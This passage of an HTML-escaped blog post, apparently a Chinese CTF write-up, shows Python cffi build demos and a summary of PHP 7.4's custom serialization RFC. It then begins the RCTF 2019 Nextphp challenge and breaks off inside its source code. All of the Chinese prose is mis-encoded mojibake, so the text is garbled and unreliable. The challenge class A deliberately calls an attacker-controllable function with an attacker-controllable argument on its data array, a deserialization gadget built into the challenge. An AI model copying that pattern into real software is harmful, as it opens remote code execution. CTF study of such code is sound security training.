&lt;p>ä»¥ä¸Šæ–¹å¼éƒ½æ˜¯åœ¨çº¿apiæ¨¡å¼ï¼Œcffiè¿˜æ”¯æŒç¦»çº¿apiæ¨¡å¼ï¼Œæ¯”å¦‚ä¸‹é¢è¿™ä¸ªdemo&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">cffi&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">FFI&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">ffibuilder&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">FFI&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">ffibuilder&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">cdef&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#34;&amp;#34;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> double sqrt(double x);
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">&amp;#34;&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># éœ€è¦çš„å¤´æ–‡ä»¶&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">ffibuilder&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">set_source&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;_libmath&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&amp;#34;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> #include &amp;lt;math.h&amp;gt;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> &amp;#34;&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">library_dirs&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[],&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">libraries&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;m&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">ffibuilder&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">compile&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">verbose&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#00a8c8">True&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>python build_cffi.py
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">_libmath&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">lib&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># ç›´æ¥è°ƒç”¨cå‡½æ•°&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">x&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">lib&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">sqrt&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">4.5&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">F&lt;/span>&lt;span style="color:#d88200">&amp;#34;The square root of 4.5 is &lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">x&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">.&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>python test.py
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211202173047579.png" alt="image-20211202173047579">&lt;/p>
&lt;p>å¯ä»¥çœ‹åˆ°è¿™é‡Œå…ˆç”¨ä¸€ä¸ªpyæ–‡ä»¶è°ƒç”¨.hæ¥ç¼–è¯‘ç”Ÿæˆ.soå’Œ.cï¼Œç„¶ååœ¨å¦ä¸€ä¸ªpyæ–‡ä»¶ä¸­è°ƒç”¨.cå³å¯&lt;/p>
&lt;p>æˆ–è€…è¿˜æœ‰ç¬¬ä¸‰ç§æ–¹å¼ï¼Œåœ¨Pythonä¸­ä½¿ç”¨å¤–éƒ¨å·²ç»å®šä¹‰å¥½çš„cåº“å‡½æ•°ï¼›è¿™é‡Œä½¿ç”¨&lt;a href="https://github.com/wolever">wolever&lt;/a>/&lt;a href="https://github.com/wolever/python-cffi-example">python-cffi-example&lt;/a>æ¥æ¼”ç¤ºï¼ˆ&lt;del>å°±ä¸å¤åˆ¶ç²˜è´´äº†æ&lt;/del> å°±ç²˜å°±ç²˜&lt;/p>
&lt;p>é¦–å…ˆæ˜¯ä¸€ä¸ª&lt;a href="https://github.dev/wolever/python-cffi-example/blob/ec14da61ee0de770750ff3781b412a3b25f020eb/cffi_example/fnmatch.h#L1-L18">fnmatch.h&lt;/a>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211202184827657.png" alt="image-20211202184827657">&lt;/p>
&lt;p>æ³¨æ„7 8 9è¡Œè¦æ”¹ä¸€ä¸‹çš„ï¼Œæ ¹æ®/usr/include/fnmatch.hæ”¹&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211202185217525.png" alt="image-20211202185217525">&lt;/p>
&lt;p>è¿™æ˜¯&lt;a href="https://github.dev/wolever/python-cffi-example/blob/ec14da61ee0de770750ff3781b412a3b25f020eb/cffi_example/build_fnmatch.py#L1">build_fnmatch.py&lt;/a>ï¼Œç”¨äºç”Ÿæˆæ¨¡å—åœ¨fnmatch.pyä¸­ä½¿ç”¨&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">os&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">cffi&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">FFI&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">ffi&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">FFI&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">ffi&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">set_source&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;cffi_example._fnmatch&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># Since we are calling fnmatch directly no custom source is necessary. We&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># need to #include &amp;lt;fnmatch.h&amp;gt;, though, because behind the scenes cffi&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># generates a .c file which contains a Python-friendly wrapper around&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># ``fnmatch``:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># static PyObject *&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># _cffi_f_fnmatch(PyObject *self, PyObject *args) {&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># ... setup ...&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># result = fnmatch(...);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># return PyInt_FromLong(result);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># }&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;#include &amp;lt;fnmatch.h&amp;gt;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># The important thing is to inclue libc in the list of libraries we&amp;#39;re&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># linking against:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">libraries&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;c&amp;#34;&lt;/span>&lt;span style="color:#111">],&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">with&lt;/span> &lt;span style="color:#111">open&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">path&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">join&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">path&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">dirname&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">__file__&lt;/span>&lt;span style="color:#111">),&lt;/span> &lt;span style="color:#d88200">&amp;#34;fnmatch.h&amp;#34;&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#00a8c8">as&lt;/span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ffi&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">cdef&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">read&lt;/span>&lt;span style="color:#111">())&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">__name__&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#34;__main__&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ffi&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">compile&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ä¸€ä¸ª&lt;a href="https://github.dev/wolever/python-cffi-example/blob/ec14da61ee0de770750ff3781b412a3b25f020eb/setup.py#L1-L33">setup.py&lt;/a>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#!/usr/bin/env python&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">os&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">sys&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">setuptools&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">setup&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">find_packages&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">chdir&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">path&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">dirname&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">sys&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">argv&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">])&lt;/span> &lt;span style="color:#f92672">or&lt;/span> &lt;span style="color:#d88200">&amp;#34;.&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">setup&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;cffi-example&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">version&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;0.1&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">classifiers&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">[&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;Development Status :: 4 - Beta&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;Programming Language :: Python :: 2&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;Programming Language :: Python :: 3&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;Programming Language :: Python :: Implementation :: PyPy&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;License :: OSI Approved :: BSD License&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">],&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">packages&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">find_packages&lt;/span>&lt;span style="color:#111">(),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">install_requires&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;cffi&amp;gt;=1.0.0&amp;#34;&lt;/span>&lt;span style="color:#111">],&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">setup_requires&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;cffi&amp;gt;=1.0.0&amp;#34;&lt;/span>&lt;span style="color:#111">],&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">cffi_modules&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">[&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;./build_fnmatch.py:ffi&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">],&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>æœ€åçš„cffi_modulesæŒ‡å®šäº†éœ€è¦ç”Ÿæˆffiå®ä¾‹çš„æ–‡ä»¶&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>pyhon setup.py install
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211202190508189.png" alt="image-20211202190508189">&lt;/p>
&lt;p>æ²¡æƒ³åˆ°æ˜¯ä¸ªæŠ¥é”™ï¼Œä»”ç»†çœ‹ä¸€ä¸‹åŸå› ï¼Œè§£å†³æ–¹æ³•æ˜¯æŠŠä¹‹å‰çš„fnmatch.hä¸­çš„åç§»æ¢æˆ16è¿›åˆ¶&lt;/p>
&lt;p>å†æ¬¡æ‰§è¡Œå°±å¥½äº†&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211202190825764.png" alt="image-20211202190825764">&lt;/p>
&lt;p>å¯ä»¥çœ‹åˆ°è¿™ç§æ–¹å¼æ¯”ä¹‹å‰ç”Ÿæˆçš„æ–‡ä»¶éƒ½è¦å¤šï¼Œç›¸å½“äºå®‰è£…äº†ä¸€ä¸ªæ¨¡å—&lt;/p>
&lt;p>ç„¶åæ˜¯ä¸€ä¸ªtest_fnmatch.pyï¼Œæ³¨æ„è¿™é‡Œç›´æ¥ç”¨ç»™å‡ºçš„æ–‡ä»¶è¿˜æ˜¯ä¼šæŠ¥é”™ï¼ŒæŠŠä¸‹å›¾é«˜äº®çš„åœ°æ–¹æ¢æˆ0x1&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211202191447689.png" alt="image-20211202191447689">&lt;/p>
&lt;p>å†æ‰§è¡Œå°±å¥½äº†&lt;/p>
&lt;p>cffiå’Œctypesè¿˜æœ‰å¾ˆå¤šçš„èŠ±æ´»ï¼Œé‰´äºæˆ‘çš„ä»£ç èƒ½åŠ›ä¸€èˆ¬ï¼ˆcå’Œpythonéƒ½æ˜¯å‹‰å¼ºå¤Ÿç”¨çš„æ°´å¹³ï¼‰ï¼Œå°±ä¸ç­é—¨å¼„æ–§äº†ï¼Œæ›´å¤šçš„ä¸œè¥¿è¿˜æ˜¯çœ‹å®˜æ–¹æ–‡æ¡£æ¯”è¾ƒé è°±ï¼ˆé“¾æ¥è´´åœ¨æœ€åäº†&lt;/p>
&lt;p>â€”â€”â€”â€”ä»€ä¹ˆï¼Ÿä¸ºä»€ä¹ˆFFI in PHPä»‹ç»çš„è¿˜ä¸å¦‚FFI in Pythonçš„å¤šï¼Ÿ&lt;/p>
&lt;p>emmmmm è¿™ä¸ªå˜› æ‰ä¸ä¼šè¯´æ˜¯å› ä¸ºæ‡’å‘¢&lt;/p>
&lt;h2 id="serializable">Serializable&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://wiki.php.net/rfc/custom_object_serialization">PHP RFC: New custom object serialization mechanism&lt;/a> | php7.4å¯ç”¨&lt;/li>
&lt;/ul>
&lt;p>å·²æœ‰çš„ååºåˆ—åŒ–é­”æœ¯æ–¹æ³•æ€»æ˜¯æœ‰å¾ˆå¤šå®‰å…¨é—®é¢˜ï¼Œè¿™ä¸ªæè®®æ–°å¢äº†&lt;code>__serialize()&lt;/code>ï¼Œ&lt;code>__unserialize()&lt;/code>ï¼Œ&lt;code>serialize()&lt;/code>ï¼Œ&lt;code>unserialize()&lt;/code>å’Œ&lt;code>Serializable()&lt;/code>&lt;/p>
&lt;p>&lt;code>serialize()&lt;/code>æ£€æŸ¥åˆ°&lt;code>__serialize()&lt;/code>çš„å­˜åœ¨åå°†åœ¨åºåˆ—åŒ–ä¹‹å‰ä¼˜å…ˆæ‰§è¡Œï¼Œè¿”å›åºåˆ—åŒ–å½¢å¼çš„æ•°ç»„ï¼Œå¦‚æœ‰é”™æŠ›å‡ºTypeErrorï¼›å¦‚æœåŒæ—¶æœ‰&lt;code>__serialize()&lt;/code>å’Œ&lt;code>__sleep()&lt;/code>ï¼Œåè€…å°†è¢«å¿½ç•¥ï¼›å¦‚æœå¯¹è±¡å®ç°äº†&lt;code>Serializable()&lt;/code>æ¥å£ï¼Œæ¥å£çš„&lt;code>serialize()&lt;/code>å°†è¢«å¿½ç•¥ï¼Œç±»ä¸­çš„&lt;code>__serialize()&lt;/code>å°†è¢«è°ƒç”¨ï¼›ååºåˆ—åŒ–æ—¶è§¦å‘&lt;code>__unserialize()&lt;/code>&lt;/p>
&lt;p>â€”â€”â€”â€”å¥½å‹¾å…«å¤æ‚çš„ï¼Œå»ºè®®ç›´æ¥çœ‹æ–‡æ¡£&lt;/p>
&lt;h2 id="rctf-2019nextphp">[RCTF 2019]Nextphp&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">A&lt;/span> &lt;span style="color:#00a8c8">implements&lt;/span> &lt;span style="color:#75af00">Serializable&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#39;ret&amp;#39;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#39;func&amp;#39;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#39;print_r&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#39;arg&amp;#39;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#39;1&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">];&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">run&lt;/span> &lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;ret&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;func&amp;#39;&lt;/span>&lt;span style="color:#111">](&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;arg&amp;#39;&lt;/span>&lt;span style="color:#111">]);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">__serialize&lt;/span>&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
